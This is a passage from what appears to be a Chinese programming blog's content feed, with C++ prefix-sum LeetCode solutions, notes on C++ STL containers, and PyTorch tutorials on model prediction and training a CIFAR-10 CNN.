&lt; n; i++) &#123;<br>            sums[i + <span class="hljs-number">1</span>] = sums[i] + nums[i];<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">sumRange</span><span class="hljs-params">(<span class="hljs-type">int</span> left, <span class="hljs-type">int</span> right)</span> </span>&#123; <br>        <span class="hljs-keyword">return</span> sums[right + <span class="hljs-number">1</span>] - sums[left]; <br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="二维区域和检索---矩阵不可变">二维区域和检索 - 矩阵不可变</h2><blockquote><p>小学数学田字格面积：<code>sums[i+1][j+1] = matrix[i][j] + sums[i][j+1] + sums[i+1][j] - sums[i][j];</code></p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">NumMatrix</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; sums;<br><br>    <span class="hljs-built_in">NumMatrix</span>(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; matrix) &#123;<br>        <span class="hljs-type">int</span> m = matrix.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> n = matrix[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>();<br>        sums.<span class="hljs-built_in">resize</span>(m + <span class="hljs-number">1</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(n + <span class="hljs-number">1</span>));<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<br>                sums[i + <span class="hljs-number">1</span>][j + <span class="hljs-number">1</span>] =<br>                    sums[i + <span class="hljs-number">1</span>][j] + sums[i][j + <span class="hljs-number">1</span>] - sums[i][j] + matrix[i][j];<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">sumRegion</span><span class="hljs-params">(<span class="hljs-type">int</span> row1, <span class="hljs-type">int</span> col1, <span class="hljs-type">int</span> row2, <span class="hljs-type">int</span> col2)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> sums[row2 + <span class="hljs-number">1</span>][col2 + <span class="hljs-number">1</span>] - sums[row1][col2 + <span class="hljs-number">1</span>] -<br>               sums[row2 + <span class="hljs-number">1</span>][col1] + sums[row1][col1];<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="除自身以外数组的乘积">除自身以外数组的乘积</h2><blockquote><p>前缀和+后缀和</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">productExceptSelf</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">pre_sums</span><span class="hljs-params">(n + <span class="hljs-number">1</span>)</span></span>;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">suf_sums</span><span class="hljs-params">(n + <span class="hljs-number">1</span>)</span></span>;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">res</span><span class="hljs-params">(n)</span></span>;<br>        pre_sums[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>        suf_sums[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            pre_sums[i + <span class="hljs-number">1</span>] = pre_sums[i] * nums[i];<br>            suf_sums[i + <span class="hljs-number">1</span>] = suf_sums[i] * nums[n - i - <span class="hljs-number">1</span>];<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            res[i] = pre_sums[i] * suf_sums[n - i - <span class="hljs-number">1</span>];<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>LeetCode</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>基本用法-C++</title>
    <link href="/2024/03/10/LeetCode/%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95-C++/"/>
    <url>/2024/03/10/LeetCode/%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95-C++/</url>
    
    <content type="html"><![CDATA[<h1 id="数组">1. 数组</h1><p>C++ 中的 <code>vector</code>是一种序列容器，可以存储任意类型的对象。这意味着它可以存储整数、浮点数、字符串或任何其他类型的对象。<code>vector</code>是一个模板类，属于标准模板库（STL）的一部分。</p><p>关键特性：</p><ol type="1"><li><p><strong>动态数组</strong>：<code>vector</code>像数组一样工作，但其大小可以动态变化。你可以在运行时添加或删除元素，而不必在编译时指定其大小。</p></li><li><p><strong>连续存储</strong>：<code>vector</code>在内存中连续存储其元素，这意味着你可以使用指针或数组索引来访问元素。</p></li><li><p><strong>随机访问</strong>：<code>vector</code>支持随机访问，这意味着你可以直接通过索引访问任何元素，时间复杂度为O(1)。</p></li><li><p><strong>自动管理内存</strong>：<code>vector</code>自动管理其元素的内存分配和释放。当 <code>vector</code>的容量不足以容纳更多元素时，它会自动扩展其容量。</p></li><li><p><strong>灵活的大小调整</strong>：你可以使用 <code>resize()</code>方法来改变 <code>vector</code>的大小，增加或减少元素数量，并相应地分配或释放内存。</p></li></ol><p>常用函数：</p><ul><li><strong>push_back(element)</strong>: 向 <code>vector</code>的末尾添加一个元素。</li><li><strong>pop_back()</strong>: 移除 <code>vector</code>末尾的元素。</li><li><strong>size()</strong>: 返回 <code>vector</code>中元素的数量。</li><li><strong>empty()</strong>: 检查 <code>vector</code>是否为空，即不包含任何元素。</li><li><strong>clear()</strong>: 移除 <code>vector</code>中的所有元素，使其大小为 0。</li><li><strong>at(index)</strong>: 访问指定位置的元素，与使用下标操作符<code>[]</code> 类似，但带有边界检查。</li><li><strong>front()</strong>: 访问 <code>vector</code>中的第一个元素。</li><li><strong>back()</strong>: 访问 <code>vector</code>中的最后一个元素。</li><li><strong>insert(position, element)</strong>: 在 <code>vector</code>的指定位置之前插入一个元素。</li><li><strong>erase(position)</strong>: 移除 <code>vector</code>中指定位置的元素。</li><li><strong>resize(new_size)</strong>: 改变 <code>vector</code>的大小，如果新大小大于当前大小，会添加默认元素。</li><li><strong>reserve(capacity)</strong>:分配至少能存储指定数量元素的内存空间，这可以提高 <code>vector</code>添加元素的效率。</li><li><strong>reverse()</strong>：反转容器中的元素。</li><li><strong>accumulate(dp.begin(), dp.end(),0)</strong>：累加，起始值为0。</li></ul><h1 id="哈希表">2. 哈希表</h1><p><code>std::unordered_map</code> 是 C++标准库中的一个关联容器，用于<strong>存储键值对（key-valuepairs）</strong>。它提供了<strong>基于哈希表的快速查找和插入</strong>操作，其时间复杂度为<strong>O(1)</strong>。unordered_map中的元素不按照任何特定顺序排序，而是根据键的哈希值进行组织。</p><ol type="1"><li><p><strong>头文件引入</strong>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_map&gt;</span></span><br></code></pre></td></tr></table></figure></li><li><p><strong>模板定义</strong>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">std::unordered_map&lt;Key, T&gt; myMap;<br></code></pre></td></tr></table></figure><p>这里的 <code>Key</code> 是键的类型，<code>T</code>是值的类型。</p></li><li><p><strong>插入元素</strong>：</p><p>使用中括号<code>[]</code>的方式：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">myMap[key] = value;<br></code></pre></td></tr></table></figure><p>或者可以使用 <code>insert()</code> 函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">myMap.<span class="hljs-built_in">insert</span>(std::<span class="hljs-built_in">make_pair</span>(key, value));<br></code></pre></td></tr></table></figure></li><li><p><strong>查找元素：</strong></p><p><code>mp.count()</code>返回一个整数，表示在映射中具有该键的元素的数量。如果该键存在，则返回1；否则返回 0。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">if</span> (mp.<span class="hljs-built_in">count</span>(counter)) &#123;<br><br>&#125; <span class="hljs-keyword">else</span> &#123;<br><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>访问元素</strong>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> it = myMap.<span class="hljs-built_in">find</span>(key);<br><span class="hljs-keyword">if</span> (it != myMap.<span class="hljs-built_in">end</span>()) &#123;<br>    <span class="hljs-comment">// key 存在</span><br>    T value = it-&gt;second;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// key 不存在</span><br>&#125;<br></code></pre></td></tr></table></figure><p>或者直接使用下标访问：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">T value = myMap[key];<br></code></pre></td></tr></table></figure></li><li><p><strong>删除元素</strong>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">myMap.<span class="hljs-built_in">erase</span>(key);<br></code></pre></td></tr></table></figure><p>或者清空整个 unordered_map：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">myMap.<span class="hljs-built_in">clear</span>();<br></code></pre></td></tr></table></figure></li><li><p><strong>大小和容量</strong>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">size_t</span> size = myMap.<span class="hljs-built_in">size</span>(); <span class="hljs-comment">// 返回元素个数</span><br><span class="hljs-type">size_t</span> bucketCount = myMap.<span class="hljs-built_in">bucket_count</span>(); <span class="hljs-comment">// 返回底层哈希表的桶数量</span><br></code></pre></td></tr></table></figure></li><li><p><strong>遍历 unordered_map</strong>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; pair : myMap) &#123;<br>    Key key = pair.first;<br>    T value = pair.second;<br>    <span class="hljs-comment">// 处理 key 和 value</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h1 id="栈">3. 栈</h1><p>在 C++ 中，stack是一个标准模板库（STL）提供的容器，它提供了一种<strong>先进后出（Last InFirst Out, LIFO）</strong>的数据结构。</p><ul><li><code>empty()</code> ：如果栈为空返回true，否则返回false</li><li><code>size()</code> ：返回栈中元素的个数</li><li><code>pop()</code>：弹栈</li><li><code>push()</code>：压栈</li><li><code>peek()</code>/<code>top()</code>：预览栈顶元素:</li></ul><p>注意：peek() 在 C++ 的 stack 中是没有定义的方法，但是 top()方法可以实现类似的功能，返回 stack 中的顶部元素的值，而不移除它。</p><h1 id="队列">4. 队列</h1><p>在 C++ 中，<code>queue</code>是一个标准模板库（STL）提供的容器，它提供了一种<strong>先进先出（FirstIn First Out, FIFO）</strong>的数据结构。</p><ul><li><code>empty()</code> ：如果队列为空返回true，否则返回false</li><li><code>size()</code> ：返回队列中元素的个数</li><li><code>pop()</code> ：删除队列首元素</li><li><code>push()</code>：在队尾压入新元素</li><li><code>front()</code> ：预览队列首元素</li><li><code>back()</code>：预览队列尾元素</li></ul><p><code>priority_queue</code> 是 C++标准库中提供的一个优先队列实现。它基于堆数据结构，并提供了一组方法来处理具有优先级的元素。</p><ul><li><code>empty()</code></li><li><code>size()</code></li><li><code>top()</code>：获取堆顶元素</li><li><code>pop()</code>：删除堆顶元素</li><li><code>push()</code>：压入新元素</li><li><code>emplace()</code>： 原地构造一个元素并插入队列</li></ul><h1 id="字符串">5. 字符串</h1><p>C++中的<code>string</code>是标准库中的一个类，用于表示和操作字符串。它提供了一系列的成员函数来进行字符串的处理，使得字符串操作更加方便和高效。</p><ul><li><code>empty()</code>：测试字符串是否为空</li><li><code>length()</code> /<code>size()</code>： 返回字符串的长度</li><li><code>at(pos)</code>：返回对字符串中位置 pos 的字符的引用</li><li><code>front()</code>：返回对字符串第一个字符的引用</li><li><code>back()</code>：返回对字符串最后一个字符的引用</li><li><code>push_back(c)</code>：将字符 c附加到字符串的末尾，将其长度增加一</li><li><code>pop_back()</code>：擦除字符串的最后一个字符，从而有效地将其长度减少一个</li><li><code>insert(pos,str)</code>：在 pos指示的字符之前将其他字符插入到字符串中</li><li><code>erase(pos,len)</code>：删除字符串的一部分，从而减少其长度</li><li><code>find(str,pos = 0)</code>：在字符串中搜索由其参数指定的序列的第一次出现。当<code>find()</code> 函数未找到指定子字符串或字符时，它将返回<code>string::npos</code>，表示搜索失败。</li><li>`<code>substr(pos=0,len)</code>：返回一个新构造的字符串对象，其值初始化为该对象的子字符串的副本</li><li><code>isalnum()</code>：检查所传的字符是否是字母和数字</li><li><code>isalpha()</code>：判断一个字符是否是字母</li><li><code>sscanf(const char* str, const char* format, ...)</code>：从一个字符串中按照指定的格式解析数据并将其存储到变量中</li><li><code>stoi(str)</code>：将字符串转换为整数</li><li><code>to_string(num)</code>：将整数转换为字符串</li><li><code>isdigit()</code>：检查给定字符是否是数字</li><li><code>string(freq, ch)</code>：创建一个新的字符串，这个字符串由字符ch重复freq次构成。</li></ul><p><strong>参考资料：</strong></p><ol type="1"><li>C++STL :unordered_map详解：https://zhuanlan.zhihu.com/p/296360525</li><li>C++ std::unordered_map最适合与示例：https://shengyu7697.github.io/std-unordered_map/</li><li>C++栈和队列的介绍与使用：https://blog.csdn.net/tham_/article/details/44733101</li><li>c++ stack pop peek使用：https://juejin.cn/s/c%2B%2B%20stack%20pop%20peek%20%E4%BD%BF%E7%94%A8</li><li>C++ vector容器浅析：https://www.runoob.com/w3cnote/cpp-vector-container-analysis.html</li><li>入门看完这一篇就够了，让你融会贯通使用C++ 的std::string初级篇！https://tigercosmos.xyz/post/2023/06/c++/std-string-beginner/</li><li>C++ 标准库 -<string>：https://www.w3ccoo.com/cpp_standard_library/string.html</li><li>C++ 语言中 priority_queue的常见用法详解：https://zhuanlan.zhihu.com/p/478887055</li></ol>]]></content>
    
    
    <categories>
      
      <category>LeetCode</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>模型测试</title>
    <link href="/2024/03/05/Python/PyTorch/%E6%A8%A1%E5%9E%8B%E6%B5%8B%E8%AF%95/"/>
    <url>/2024/03/05/Python/PyTorch/%E6%A8%A1%E5%9E%8B%E6%B5%8B%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<p>使用PyTorch训练好的模型进行新数据的预测包括以下几个步骤：</p><h1 id="加载模型">1. 加载模型</h1><p>首先，你需要加载训练好的模型。如果模型是使用PyTorch的<code>torch.save()</code>方法保存的，可以使用<code>torch.load()</code>来加载。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><br><span class="hljs-comment"># 加载模型</span><br>model = torch.load(<span class="hljs-string">&#x27;model_path.pth&#x27;</span>)<br><br><span class="hljs-comment"># 确保在评估模式下运行模型，这对于某些模型组件（如Dropout和BatchNorm）来说很重要</span><br>model.<span class="hljs-built_in">eval</span>()<br></code></pre></td></tr></table></figure><p>如果模型是通过保存模型的状态字典（state_dict）来保存的，那么你需要先实例化模型，然后使用<code>load_state_dict()</code>方法加载状态字典。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">model = ModelClass(*args, **kwargs)  <span class="hljs-comment"># 使用与训练时相同的参数实例化模型</span><br>model.load_state_dict(torch.load(<span class="hljs-string">&#x27;model_state_dict.pth&#x27;</span>))<br>model.<span class="hljs-built_in">eval</span>()<br></code></pre></td></tr></table></figure><h1 id="准备数据">2. 准备数据</h1><p>接下来，你需要准备要预测的数据。这通常意味着你需要将数据处理成模型训练时相同的格式。这可能包括调整大小、归一化等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> torchvision <span class="hljs-keyword">import</span> transforms<br><br><span class="hljs-comment"># 假设我们正在处理图像数据</span><br>transform = transforms.Compose([<br>    transforms.Resize((<span class="hljs-number">224</span>, <span class="hljs-number">224</span>)),<br>    transforms.ToTensor(),<br>    transforms.Normalize(mean=[<span class="hljs-number">0.485</span>, <span class="hljs-number">0.456</span>, <span class="hljs-number">0.406</span>], std=[<span class="hljs-number">0.229</span>, <span class="hljs-number">0.224</span>, <span class="hljs-number">0.225</span>]),<br>])<br><br><span class="hljs-comment"># 加载你的数据</span><br>data = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;path_to_your_data.jpg&#x27;</span>)<br>data = transform(data)<br>data = data.unsqueeze(<span class="hljs-number">0</span>)  <span class="hljs-comment"># 增加批次维度</span><br></code></pre></td></tr></table></figure><h1 id="进行预测">3. 进行预测</h1><p>最后，你可以使用模型对准备好的数据进行预测。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> torch.no_grad():  <span class="hljs-comment"># 在这个block中，不计算梯度</span><br>    outputs = model(data)<br>    _, predicted = torch.<span class="hljs-built_in">max</span>(outputs, <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>在上述代码中，<code>outputs</code>是模型的原始输出。如果是分类问题，<code>torch.max</code>可以帮助我们找到概率最高的类别。</p><h1 id="注意事项">注意事项</h1><ul><li>确保在进行预测前将模型设置为评估模式（<code>model.eval()</code>），这对于某些类型的层（如Dropout和BatchNorm）是必要的，以确保它们在推理时表现正常。</li><li>使用<code>torch.no_grad()</code>环境来进行预测，这样可以减少内存消耗并加速计算，因为它告诉PyTorch不需要进行梯度计算。</li><li>根据你的具体任务（如分类、回归等），最后的处理步骤可能会有所不同。</li></ul><p>这就是使用PyTorch进行模型预测的基本流程。如果你有特定的模型或数据，还可能需要进行一些调整。</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>Pytorch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>模型训练</title>
    <link href="/2024/03/05/Python/PyTorch/%E6%A8%A1%E5%9E%8B%E8%AE%AD%E7%BB%83/"/>
    <url>/2024/03/05/Python/PyTorch/%E6%A8%A1%E5%9E%8B%E8%AE%AD%E7%BB%83/</url>
    
    <content type="html"><![CDATA[<h1 id="训练示例">1. 训练示例</h1><p>下面是使用 PyTorch进行模型训练的示例代码，包括数据加载、模型定义、损失函数和优化器的设置、训练循环以及模型评估。这个例子中，我们将训练一个简单的卷积神经网络(CNN)来分类CIFAR-10 数据集的图像。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><span class="hljs-keyword">import</span> torch.optim <span class="hljs-keyword">as</span> optim<br><span class="hljs-keyword">import</span> torchvision<br><span class="hljs-keyword">import</span> torchvision.transforms <span class="hljs-keyword">as</span> transforms<br><br><span class="hljs-comment"># 1. 数据加载和预处理</span><br>transform = transforms.Compose(<br>    [transforms.ToTensor(),<br>     transforms.Normalize((<span class="hljs-number">0.5</span>, <span class="hljs-number">0.5</span>, <span class="hljs-number">0.5</span>), (<span class="hljs-number">0.5</span>, <span class="hljs-number">0.5</span>, <span class="hljs-number">0.5</span>))])<br><br>trainset = torchvision.datasets.CIFAR10(root=<span class="hljs-string">&#x27;./data&#x27;</span>, train=<span class="hljs-literal">True</span>,<br>                                        download=<span class="hljs-literal">True</span>, transform=transform)<br>trainloader = torch.utils.data.DataLoader(trainset, batch_size=<span class="hljs-number">4</span>,<br>                                          shuffle=<span class="hljs-literal">True</span>, num_workers=<span class="hljs-number">2</span>)<br><br>testset = torchvision.datasets.CIFAR10(root=<span class="hljs-string">&#x27;./data&#x27;</span>, train=<span class="hljs-literal">False</span>,<br>                                       download=<span class="hljs-literal">True</span>, transform=transform)<br>testloader = torch.utils.data.DataLoader(testset, batch_size=<span class="hljs-number">4</span>,<br>                                         shuffle=<span class="hljs-literal">False</span>, num_workers=<span class="hljs-number">2</span>)<br><br>classes = (<span class="hljs-string">&#x27;plane&#x27;</span>, <span class="hljs-string">&#x27;car&#x27;</span>, <span class="hljs-string">&#x27;bird&#x27;</span>, <span class="hljs-string">&#x27;cat&#x27;</span>,<br>           <span class="hljs-string">&#x27;deer&#x27;</span>, <span class="hljs-string">&#x27;dog&#x27;</span>, <span class="hljs-string">&#x27;frog&#x27;</span>, <span class="hljs-string">&#x27;horse&#x27;</span>, <span class="hljs-string">&#x27;ship&#x27;</span>, <span class="hljs-string">&#x27;truck&#x27;</span>)<br><br><span class="hljs-comment"># 2. 定义卷积神经网络</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Net</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>(Net, self).__init__()<br>        self.conv1 = nn.Conv2d(<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>)  <span class="hljs-comment"># 输入通道数3，输出通道数6，卷积核大小5x5</span><br>        self.pool = nn.MaxPool2d(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>)   <span class="hljs-comment"># 最大池化层，窗口大小2x2</span><br>        self.conv2 = nn.Conv2d(<span class="hljs-number">6</span>, <span class="hljs-number">16</span>, <span class="hljs-number">5</span>) <span class="hljs-comment"># 第二个卷积层</span><br>        self.fc1 = nn.Linear(<span class="hljs-number">16</span> * <span class="hljs-number">5</span> * <span class="hljs-number">5</span>, <span class="hljs-number">120</span>) <span class="hljs-comment"># 全连接层，输入特征数16*5*5，输出特征数120</span><br>        self.fc2 = nn.Linear(<span class="hljs-number">120</span>, <span class="hljs-number">84</span>)<br>        self.fc3 = nn.Linear(<span class="hljs-number">84</span>, <span class="hljs-number">10</span>)  <span class="hljs-comment"># 最后一个全连接层输出类别数为10</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x</span>):<br>        x = self.pool(nn.functional.relu(self.conv1(x)))<br>        x = self.pool(nn.functional.relu(self.conv2(x)))<br>        x = torch.flatten(x, <span class="hljs-number">1</span>) <span class="hljs-comment"># 展平除批次维度外的所有维度</span><br>        x = nn.functional.relu(self.fc1(x))<br>        x = nn.functional.relu(self.fc2(x))<br>        x = self.fc3(x)<br>        <span class="hljs-keyword">return</span> x<br><br>net = Net()<br><br><span class="hljs-comment"># 3. 定义损失函数和优化器</span><br>criterion = nn.CrossEntropyLoss()  <span class="hljs-comment"># 交叉熵损失函数</span><br>optimizer = optim.SGD(net.parameters(), lr=<span class="hljs-number">0.001</span>, momentum=<span class="hljs-number">0.9</span>)  <span class="hljs-comment"># SGD优化器</span><br><br><span class="hljs-comment"># 4. 训练网络</span><br><span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):  <span class="hljs-comment"># 多次遍历数据集</span><br><br>    running_loss = <span class="hljs-number">0.0</span><br>    <span class="hljs-comment"># 这里的 enumerate 函数是 Python 的内置函数，用于将一个可迭代对象（如列表、元组或者这里的数据加载器）组合成一个索引序列，同时列出数据和数据下标。</span><br>    <span class="hljs-keyword">for</span> i, data <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(trainloader, <span class="hljs-number">0</span>):<br>        inputs, labels = data<br><br>        optimizer.zero_grad()  <span class="hljs-comment"># 梯度清零</span><br><br>        outputs = net(inputs)  <span class="hljs-comment"># 前向传播</span><br>        loss = criterion(outputs, labels)  <span class="hljs-comment"># 计算损失</span><br>        loss.backward()  <span class="hljs-comment"># 反向传播</span><br>        optimizer.step()  <span class="hljs-comment"># 优化</span><br><br>        running_loss += loss.item()<br>        <span class="hljs-keyword">if</span> i % <span class="hljs-number">2000</span> == <span class="hljs-number">1999</span>:    <span class="hljs-comment"># 每2000个批次打印一次训练状态</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[%d, %5d] loss: %.3f&#x27;</span> %<br>                  (epoch + <span class="hljs-number">1</span>, i + <span class="hljs-number">1</span>, running_loss / <span class="hljs-number">2000</span>))<br>            running_loss = <span class="hljs-number">0.0</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Finished Training&#x27;</span>)<br><br><span class="hljs-comment"># 5. 测试网络</span><br>correct = <span class="hljs-number">0</span><br>total = <span class="hljs-number">0</span><br><span class="hljs-keyword">with</span> torch.no_grad():<br>    <span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> testloader:<br>        images, labels = data<br>        outputs = net(images)<br>        <span class="hljs-comment"># torch.max() 